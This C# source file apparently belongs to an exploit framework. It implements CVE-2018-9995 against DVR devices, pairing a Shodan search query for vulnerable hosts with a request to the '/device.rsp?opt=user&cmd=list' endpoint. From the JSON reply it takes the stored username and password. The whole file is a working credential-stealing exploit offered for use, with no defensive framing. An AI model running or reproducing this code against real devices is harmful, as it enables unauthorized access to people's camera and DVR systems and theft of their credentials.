using System;
using ExploitMaker;

namespace Exploits
{
    public class CVE_2018_9995 : Exploit
    {
        public override string ShodanSearchQuery => "Server: GNU rsp/1.0";

        public override string Description => CommonName + ": Gets DVR Credentials in many vendors that responds using the banner 'Server: GNU rsp/1.0'";

        public override string CommonName => "CVE-2018-9995";

        public override Credencial Run(string url)
        {
            dynamic json = HttpRequester.Get(url + "/device.rsp?opt=user&cmd=list");

            try
            {
                string username = json.list[0].uid;
                string pass = json.list[0].pwd;

                if (username != null && pass != null)
                    return new Credencial(username, pass);

                return null;
            }
            catch (Exception)
            {
                return null;
            }
        }
    }
}